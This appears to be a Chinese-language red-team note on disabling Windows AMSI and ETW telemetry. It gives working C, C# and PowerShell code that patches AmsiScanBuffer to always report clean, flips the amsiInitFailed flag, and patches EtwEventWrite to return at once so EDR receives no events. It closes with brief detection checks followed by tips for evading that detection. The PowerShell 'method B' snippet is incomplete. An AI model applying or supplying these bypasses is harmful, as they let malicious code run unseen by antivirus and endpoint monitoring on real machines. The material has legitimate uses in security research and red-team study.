# AMSI/ETW Patch 技术

## AMSI (Anti-Malware Scan Interface)

### 原理
AMSI 是 Windows 提供的统一恶意软件扫描接口。
PowerShell、VBScript、JScript、VBA 等脚本引擎在执行前通过 AMSI 扫描。
patch AmsiScanBuffer 使其返回"干净"即可绕过。

### 方法 1: 内存 patch
```c
#include <windows.h>

void PatchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    void* scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scanBuffer) return;

    // patch: 返回 AMSI_RESULT_CLEAN (0)
    // 原型: HRESULT AmsiScanBuffer(...)
    // 修改为: mov eax, 0; ret
    // hex: B8 00 00 00 00 C3
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    DWORD oldProtect;
    VirtualProtect(scanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(scanBuffer, patch, sizeof(patch));
    VirtualProtect(scanBuffer, sizeof(patch), oldProtect, &oldProtect);
}
```

### 方法 2: PowerShell one-liner
```powershell
# 方法 A: 修改 AmsiContext
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法 B: patch AmsiScanBuffer
$ptr = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetMethod('ScanContent').GetImplementation().MethodHandle.GetFunctionPointer()
# 或更简单
$Win32 = Add-Type -Namespace Win32 -Name API -MemberDefinition @'
[DllImport("amsi.dll")]
public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr session, out uint result);
'@
# patch AmsiScanBuffer 入口
```

### 方法 3: CLR 注入 (AMSIScanBuffer patch from .NET)
```csharp
using System;
using System.Runtime.InteropServices;

class AmsiPatch {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size,
        uint newProtect, out uint oldProtect);

    public static void Patch() {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr scanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        byte[] patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
        uint old;
        VirtualProtect(scanBuffer, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, scanBuffer, patch.Length);
        VirtualProtect(scanBuffer, (UIntPtr)patch.Length, old, out old);
    }
}
```

## ETW (Event Tracing for Windows)

### 原理
ETW 是 Windows 的事件追踪机制。
EDR 用 ETW 监控进程创建、网络连接、文件操作。
patch EtwEventWrite 使其直接返回。

### 方法 1: patch ntdll!EtwEventWrite
```c
void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWrite) return;

    // ret (0xC3) — 直接返回，不记录任何事件
    BYTE patch[] = { 0xC3 };
    DWORD oldProtect;
    VirtualProtect(etwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(etwEventWrite, patch, sizeof(patch));
    VirtualProtect(etwEventWrite, sizeof(patch), oldProtect, &oldProtect);
}
```

### 方法 2: ETW Provider 注册阻断
```c
// 卸载已注册的 ETW provider
// 枚举 EtwpGuidsHashTable，删除目标 provider
// 需要内核态访问或 ntdll 内部偏移
```

### 方法 3: 伪 provider (更隐蔽)
```c
// 注册一个假的 ETW provider GUID，
// 让 EDR 的 trace session收到空数据
// 比 patch 更隐蔽，不改代码段
```

## 检测与规避

### 检测 AMSI patch 的方法
- 从磁盘加载干净 amsi.dll，比对内存
- 检查 AmsiScanBuffer 是否被 VirtualProtect 修改
- 检查 AmsiInitFailed 标志

### 规避检测的方法
- 不 patch amsi.dll 本身，而是在调用链中 hook
- 使用 CLR profiling API 注入
- 在 AppInit_DLLs 或 TLS 回调中早期 patch
- 从磁盘重新加载干净 amsi.dll 到新内存区域
